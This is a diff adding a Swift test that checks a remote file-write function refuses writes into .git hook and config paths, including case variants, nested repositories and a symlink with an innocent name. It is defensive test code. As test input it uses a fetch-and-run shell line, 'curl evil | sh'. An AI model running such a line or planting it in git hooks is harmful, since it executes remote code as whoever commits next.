@@ -95,6 +95,31 @@ struct WorkspaceFileAccessTests {
                                                     text: "[[quick_prompts]]\nname = \"x\"\n", revision: created.revision)
         #expect(edited.revision != created.revision, "the revision it answered is the one to save with next")
     }
+
+    /// L6 in the review of 19 September 2026: a hook written into `.git` runs as whoever commits next.
+    @Test func nothingIsWrittenInsideGit() throws {
+        let (workspace, _) = try fixture()
+        let hooks = workspace.path + "/.git/hooks"
+        try FileManager.default.createDirectory(atPath: hooks, withIntermediateDirectories: true)
+        try "#!/bin/sh\n".write(toFile: hooks + "/pre-commit", atomically: true, encoding: .utf8)
+        let original = try RemoteFileOperations.revision(Data(contentsOf: URL(fileURLWithPath: hooks + "/pre-commit")))
+        for path in [".git/hooks/pre-commit", ".GIT/hooks/post-checkout", "vendor/lib/.git/config"] {
+            #expect(throws: RemoteFailure.self, "\(path)") {
+                try RemoteFileOperations.write(workspace: workspace, path: path, text: "curl evil | sh", revision: "")
+            }
+        }
+        #expect(throws: RemoteFailure.self) {
+            try RemoteFileOperations.write(workspace: workspace, path: ".git/hooks/pre-commit", text: "curl evil | sh", revision: original)
+        }
+        // Through a symlink with an innocent name, too.
+        try FileManager.default.createSymbolicLink(atPath: workspace.path + "/innocent", withDestinationPath: ".git/hooks")
+        #expect(throws: RemoteFailure.self) {
+            try RemoteFileOperations.write(workspace: workspace, path: "innocent/pre-commit", text: "curl evil | sh", revision: original)
+        }
+        #expect(try String(contentsOfFile: hooks + "/pre-commit", encoding: .utf8) == "#!/bin/sh\n")
+        // Reading is still allowed.
+        #expect(try RemoteFileOperations.download(workspace: workspace, path: ".git/hooks/pre-commit").data == Data("#!/bin/sh\n".utf8))
+    }
 }
 
 private actor RemoteFileSaveGate {
